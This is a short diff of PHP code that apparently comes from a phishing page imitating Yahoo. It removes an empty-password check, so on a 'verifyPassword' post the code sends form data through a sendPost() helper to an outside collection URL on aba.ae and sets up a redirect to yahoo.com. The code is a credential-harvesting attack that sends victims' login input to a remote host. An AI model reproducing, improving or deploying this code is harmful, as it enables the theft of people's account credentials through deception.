@@ -173,18 +173,8 @@ root.isIOSDevice = true;
 	
 	if(isset($_POST['verifyPassword'])){
 		
-		if(empty($_POST['password'])){
-			
-			
-			
-			
-		}else{
-			
-			
-			
-			
-			
-			//----------------send request post to url ----------------
+		
+					//----------------send request post to url ----------------
 function sendPost($url,$data) {
 	
 	
@@ -218,9 +208,7 @@ sendPost('http://saveinfo.aba.ae/Save/yahoo.php',$data);
 $url = "https://www.yahoo.com";
 
 //header("LOCATION: ".$url."");
-	
-			
-		}
+
 	}
 	
 	
